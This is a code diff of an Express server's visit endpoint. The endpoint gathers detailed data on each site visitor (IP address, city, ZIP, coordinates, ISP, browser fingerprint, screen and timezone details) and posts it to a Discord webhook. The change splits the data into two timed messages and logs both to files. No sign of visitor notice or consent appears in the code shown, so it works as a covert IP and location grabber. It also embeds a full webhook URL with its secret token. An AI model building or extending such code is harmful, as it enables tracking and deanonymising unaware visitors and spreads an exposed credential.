@@ -1,4 +1,3 @@
-
 const express = require('express');
 const cors = require('cors');
 const useragent = require('useragent');
@@ -240,71 +239,114 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
     const webhookURL = 'https://discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';
     
-    const payload = {
+    const fields = [
+      { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
+      { name: 'Device', value: visitorInfo.device, inline: true },
+      { name: 'IP', value: visitorInfo.ip, inline: true },
+      { name: 'Country', value: visitorInfo.country, inline: true },
+      { name: 'Region', value: visitorInfo.region, inline: true },
+      { name: 'City', value: visitorInfo.city, inline: true },
+      { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
+      { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
+      { name: 'ISP', value: visitorInfo.isp, inline: true },
+      { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
+      { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
+      { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
+      { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
+      { name: 'Hosting', value: visitorInfo.hosting ? 'Yes' : 'No', inline: true },
+      { name: 'Browser', value: visitorInfo.browser, inline: true },
+      { name: 'OS', value: visitorInfo.os, inline: true },
+      { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
+      { name: 'Referer', value: visitorInfo.referer, inline: true },
+      { name: 'Language', value: visitorInfo.acceptLanguage, inline: true },
+      { name: 'Accept', value: visitorInfo.accept, inline: true },
+      { name: 'Connection', value: visitorInfo.connection, inline: true },
+      { name: 'Fingerprint', value: visitorInfo.fingerprint, inline: true },
+      { name: 'Screen Size', value: visitorInfo.screenSize, inline: true },
+      { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
+      { name: 'Timezone', value: visitorInfo.timezone, inline: true },
+      { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
+    ];
+
+    const firstBatch = fields.slice(0, 13); // Session ID to Proxy
+    const secondBatch = fields.slice(13);   // Hosting to Threats
+
+    const payload1 = {
       embeds: [{
-        title: 'New Visitor Detected!',
+        title: 'New Visitor Detected! (Part 1)',
         color: threats.length ? 0xff0000 : 0x00ff00,
         timestamp: visitorInfo.timestamp,
-        fields: [
-          { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
-          { name: 'Device', value: visitorInfo.device, inline: true },
-          { name: 'IP', value: visitorInfo.ip, inline: true },
-          { name: 'Country', value: visitorInfo.country, inline: true },
-          { name: 'Region', value: visitorInfo.region, inline: true },
-          { name: 'City', value: visitorInfo.city, inline: true },
-          { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
-          { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
-          { name: 'ISP', value: visitorInfo.isp, inline: true },
-          { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
-          { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
-          { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
-          { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
-          { name: 'Hosting', value: visitorInfo.hosting ? 'Yes' : 'No', inline: true },
-          { name: 'Browser', value: visitorInfo.browser, inline: true },
-          { name: 'OS', value: visitorInfo.os, inline: true },
-          { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
-          { name: 'Referer', value: visitorInfo.referer, inline: true },
-          { name: 'Language', value: visitorInfo.acceptLanguage, inline: true },
-          { name: 'Accept', value: visitorInfo.accept, inline: true },
-          { name: 'Connection', value: visitorInfo.connection, inline: true },
-          { name: 'Fingerprint', value: visitorInfo.fingerprint, inline: true },
-          { name: 'Screen Size', value: visitorInfo.screenSize, inline: true },
-          { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
-          { name: 'Timezone', value: visitorInfo.timezone, inline: true },
-          { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
-        ]
+        fields: firstBatch
+      }]
+    };
+
+    const payload2 = {
+      embeds: [{
+        title: 'New Visitor Detected! (Part 2)',
+        color: threats.length ? 0xff0000 : 0x00ff00,
+        timestamp: visitorInfo.timestamp,
+        fields: secondBatch
       }]
     };
 
     try {
-      // Save payload to a .txt file
+      // Save payloads to .txt files
       const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
       const logDir = path.join(__dirname, 'logs');
-      const logFile = path.join(logDir, `webhook_payload_${timestamp}.txt`);
       await fs.mkdir(logDir, { recursive: true });
-      await fs.writeFile(logFile, JSON.stringify(payload, null, 2));
-      logger.info('Saved webhook payload to file', { file: logFile, payloadSize: JSON.stringify(payload).length });
 
-      // Send to Discord webhook
-      logger.info('Attempting to send to Discord Webhook', { webhookURL, payloadSize: JSON.stringify(payload).length });
-      const webhookResponse = await fetch(webhookURL, {
+      const logFile1 = path.join(logDir, `webhook_payload_1_${timestamp}.txt`);
+      await fs.writeFile(logFile1, JSON.stringify(payload1, null, 2));
+      logger.info('Saved webhook payload 1 to file', { file: logFile1, payloadSize: JSON.stringify(payload1).length });
+
+      const logFile2 = path.join(logDir, `webhook_payload_2_${timestamp}.txt`);
+      await fs.writeFile(logFile2, JSON.stringify(payload2, null, 2));
+      logger.info('Saved webhook payload 2 to file', { file: logFile2, payloadSize: JSON.stringify(payload2).length });
+
+      // Send first webhook
+      logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
+      const webhookResponse1 = await fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(payload1)
       });
 
-      if (!webhookResponse.ok) {
-        const text = await webhookResponse.text();
-        logger.error('Failed to send to Discord Webhook', {
-          status: webhookResponse.status,
-          statusText: webhookResponse.statusText,
+      if (!webhookResponse1.ok) {
+        const text = await webhookResponse1.text();
+        logger.error('Failed to send to Discord Webhook (Part 1)', {
+          status: webhookResponse1.status,
+          statusText: webhookResponse1.statusText,
           response: text,
           webhookURL
         });
-        return res.status(500).send('Failed to send visitor info to Discord');
+        return res.status(500).send('Failed to send visitor info to Discord (Part 1)');
       }
 
-      logger.info('Successfully sent to Discord Webhook', { status: webhookResponse.status, webhookURL });
+      logger.info('Successfully sent to Discord Webhook (Part 1)', { status: webhookResponse1.status, webhookURL });
+
+      // Delay to avoid rate limits
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Send second webhook
+      logger.info('Attempting to send to Discord Webhook (Part 2)', { webhookURL, payloadSize: JSON.stringify(payload2).length });
+      const webhookResponse2 = await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload2)
+      });
+
+      if (!webhookResponse2.ok) {
+        const text = await webhookResponse2.text();
+        logger.error('Failed to send to Discord Webhook (Part 2)', {
+          status: webhookResponse2.status,
+          statusText: webhookResponse2.statusText,
+          response: text,
+          webhookURL
+        });
+        return res.status(500).send('Failed to send visitor info to Discord (Part 2)');
+      }
+
+      logger.info('Successfully sent to Discord Webhook (Part 2)', { status: webhookResponse2.status, webhookURL });
     } catch (error) {
       logger.error('Error sending to Discord Webhook', { error: error.message, stack: error.stack, webhookURL });
       return res.status(500).send('Error sending visitor info to Discord');
